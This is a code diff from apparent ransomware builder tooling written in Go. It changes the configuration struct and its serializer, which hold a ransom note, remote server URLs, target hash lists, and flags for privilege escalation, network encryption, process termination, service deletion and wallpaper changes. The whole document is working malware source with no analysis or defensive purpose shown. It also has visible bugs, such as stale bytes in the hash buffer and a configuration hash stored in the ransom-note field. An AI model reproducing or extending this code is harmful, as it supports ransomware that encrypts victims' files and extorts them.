@@ -49,18 +49,18 @@ type Configuration struct {
 	terminateProcessFlag    bool
 	deleteServiceFlag       bool
 	wallpaperFlag           bool
-	mutexFlag               bool
+	runOnceFlag             bool
 	serverCommunicationFlag bool
-	processHashList         []uint64
-	serviceHashList         []uint64
+	processHashList         []uint32
+	serviceHashList         []uint32
 	remoteServerURLList     [][]byte
 	ransomNoteContent       []byte
-	ransomNoteContentHash   uint64
-	configurationHash       uint64
-	mutexString             []byte
-	fileHashList            []uint64
-	folderHashList          []uint64
-	extensionHashList       []uint64
+	ransomNoteContentHash   uint32
+	runOnceString           []byte
+	fileHashList            []uint32
+	folderHashList          []uint32
+	extensionHashList       []uint32
+	configurationHash       uint32
 }
 
 func createConfiguration() (*Configuration, error) {
@@ -83,19 +83,19 @@ func (config *Configuration) setFlags(flags []bool) {
 	config.terminateProcessFlag = flags[3]
 	config.deleteServiceFlag = flags[4]
 	config.wallpaperFlag = flags[5]
-	config.mutexFlag = flags[6]
+	config.runOnceFlag = flags[6]
 	config.serverCommunicationFlag = flags[7]
 }
 
-func (config *Configuration) setProcessHashList(processHashList []uint64) {
+func (config *Configuration) setProcessHashList(processHashList []uint32) {
 	config.processHashList = processHashList
 }
 
-func (config *Configuration) appendProcessHashList(hash uint64) {
+func (config *Configuration) appendProcessHashList(hash uint32) {
 	config.processHashList = append(config.processHashList, hash)
 }
 
-func (config *Configuration) removeProcessHashList(hash uint64) {
+func (config *Configuration) removeProcessHashList(hash uint32) {
 	for index, eachHash := range config.processHashList {
 		if eachHash == hash {
 			config.processHashList = append(config.processHashList[:index], config.processHashList[index+1:]...)
@@ -104,15 +104,15 @@ func (config *Configuration) removeProcessHashList(hash uint64) {
 	}
 }
 
-func (config *Configuration) setFileHashList(fileHashList []uint64) {
+func (config *Configuration) setFileHashList(fileHashList []uint32) {
 	config.fileHashList = fileHashList
 }
 
-func (config *Configuration) appendFileHashList(hash uint64) {
+func (config *Configuration) appendFileHashList(hash uint32) {
 	config.fileHashList = append(config.fileHashList, hash)
 }
 
-func (config *Configuration) removeFileHashList(hash uint64) {
+func (config *Configuration) removeFileHashList(hash uint32) {
 	for index, eachHash := range config.fileHashList {
 		if eachHash == hash {
 			config.fileHashList = append(config.fileHashList[:index], config.fileHashList[index+1:]...)
@@ -121,15 +121,15 @@ func (config *Configuration) removeFileHashList(hash uint64) {
 	}
 }
 
-func (config *Configuration) setFolderHashList(folderHashList []uint64) {
+func (config *Configuration) setFolderHashList(folderHashList []uint32) {
 	config.folderHashList = folderHashList
 }
 
-func (config *Configuration) appendFolderHashList(hash uint64) {
+func (config *Configuration) appendFolderHashList(hash uint32) {
 	config.folderHashList = append(config.folderHashList, hash)
 }
 
-func (config *Configuration) removeFolderHashList(hash uint64) {
+func (config *Configuration) removeFolderHashList(hash uint32) {
 	for index, eachHash := range config.folderHashList {
 		if eachHash == hash {
 			config.folderHashList = append(config.folderHashList[:index], config.folderHashList[index+1:]...)
@@ -138,15 +138,15 @@ func (config *Configuration) removeFolderHashList(hash uint64) {
 	}
 }
 
-func (config *Configuration) setExtensionHashList(extensionHashList []uint64) {
+func (config *Configuration) setExtensionHashList(extensionHashList []uint32) {
 	config.extensionHashList = extensionHashList
 }
 
-func (config *Configuration) appendExtensionHashList(hash uint64) {
+func (config *Configuration) appendExtensionHashList(hash uint32) {
 	config.extensionHashList = append(config.extensionHashList, hash)
 }
 
-func (config *Configuration) removeExtensionHashList(hash uint64) {
+func (config *Configuration) removeExtensionHashList(hash uint32) {
 	for index, eachHash := range config.extensionHashList {
 		if eachHash == hash {
 			config.extensionHashList = append(config.extensionHashList[:index], config.extensionHashList[index+1:]...)
@@ -155,15 +155,15 @@ func (config *Configuration) removeExtensionHashList(hash uint64) {
 	}
 }
 
-func (config *Configuration) setServiceHashList(serviceHashList []uint64) {
+func (config *Configuration) setServiceHashList(serviceHashList []uint32) {
 	config.serviceHashList = serviceHashList
 }
 
-func (config *Configuration) appendServiceHashList(hash uint64) {
+func (config *Configuration) appendServiceHashList(hash uint32) {
 	config.serviceHashList = append(config.serviceHashList, hash)
 }
 
-func (config *Configuration) removeServiceHashList(hash uint64) {
+func (config *Configuration) removeServiceHashList(hash uint32) {
 	for index, eachHash := range config.serviceHashList {
 		if eachHash == hash {
 			config.serviceHashList = append(config.serviceHashList[:index], config.serviceHashList[index+1:]...)
@@ -184,16 +184,16 @@ func (config *Configuration) setRansomNoteContent(ransomNoteContent []byte) {
 	config.ransomNoteContent = ransomNoteContent
 }
 
-func (config *Configuration) setRansomNoteContentHash(ransomNoteContentHash uint64) {
+func (config *Configuration) setRansomNoteContentHash(ransomNoteContentHash uint32) {
 	config.ransomNoteContentHash = ransomNoteContentHash
 }
 
-func (config *Configuration) setConfigurationHash(configurationHash uint64) {
+func (config *Configuration) setConfigurationHash(configurationHash uint32) {
 	config.configurationHash = configurationHash
 }
 
-func (config *Configuration) setMutexString(mutexString []byte) {
-	config.mutexString = mutexString
+func (config *Configuration) setRunOnceString(runOnceString []byte) {
+	config.runOnceString = runOnceString
 }
 
 // note:implement for when fields are empty
@@ -214,7 +214,7 @@ func (config *Configuration) toBytes() []byte {
 
 	// add flags
 	flags := []bool{config.largeFileEncryptFlag, config.privilegeEscalationFlag, config.networkEncryptFlag,
-		config.terminateProcessFlag, config.deleteServiceFlag, config.wallpaperFlag, config.mutexFlag, config.serverCommunicationFlag}
+		config.terminateProcessFlag, config.deleteServiceFlag, config.wallpaperFlag, config.runOnceFlag, config.serverCommunicationFlag}
 
 	for _, flag := range flags {
 		if flag {
@@ -230,7 +230,7 @@ func (config *Configuration) toBytes() []byte {
 	hashBuffer := make([]byte, 8)
 
 	for _, eachHash := range config.processHashList {
-		binary.LittleEndian.PutUint64(hashBuffer, eachHash)
+		binary.LittleEndian.PutUint32(hashBuffer, eachHash)
 
 		result = append(result, hashBuffer...)
 	}
@@ -240,7 +240,7 @@ func (config *Configuration) toBytes() []byte {
 	// add service hash list
 
 	for _, eachHash := range config.serviceHashList {
-		binary.LittleEndian.PutUint64(hashBuffer, eachHash)
+		binary.LittleEndian.PutUint32(hashBuffer, eachHash)
 
 		result = append(result, hashBuffer...)
 	}
@@ -262,23 +262,18 @@ func (config *Configuration) toBytes() []byte {
 	result = append(result, separator...)
 
 	// add ransomNoteContentHash
-	binary.LittleEndian.PutUint64(hashBuffer, config.ransomNoteContentHash)
+	binary.LittleEndian.PutUint32(hashBuffer, config.ransomNoteContentHash)
 	result = append(result, hashBuffer...)
 	result = append(result, separator...)
 
-	// add configurationHash
-	binary.LittleEndian.PutUint64(hashBuffer, config.ransomNoteContentHash)
-	result = append(result, hashBuffer...)
-	result = append(result, separator...)
-
-	// add mutexstring
-	result = append(result, config.mutexString...)
+	// add runOncestring
+	result = append(result, config.runOnceString...)
 	result = append(result, separator...)
 
 	// add fileHashList
 
 	for _, eachHash := range config.fileHashList {
-		binary.LittleEndian.PutUint64(hashBuffer, eachHash)
+		binary.LittleEndian.PutUint32(hashBuffer, eachHash)
 
 		result = append(result, hashBuffer...)
 	}
@@ -287,7 +282,7 @@ func (config *Configuration) toBytes() []byte {
 	// add folderHashList
 
 	for _, eachHash := range config.folderHashList {
-		binary.LittleEndian.PutUint64(hashBuffer, eachHash)
+		binary.LittleEndian.PutUint32(hashBuffer, eachHash)
 
 		result = append(result, hashBuffer...)
 	}
@@ -295,9 +290,16 @@ func (config *Configuration) toBytes() []byte {
 
 	// add extensionHashList
 	for _, eachHash := range config.extensionHashList {
-		binary.LittleEndian.PutUint64(hashBuffer, eachHash)
+		binary.LittleEndian.PutUint32(hashBuffer, eachHash)
 
 		result = append(result, hashBuffer...)
 	}
+	result = append(result, separator...)
+
+	config.ransomNoteContentHash = bufferHashing(result)
+	// add configurationHash
+	binary.LittleEndian.PutUint32(hashBuffer, config.ransomNoteContentHash)
+	result = append(result, hashBuffer...)
+	result = append(result, separator...)
 	return result
 }
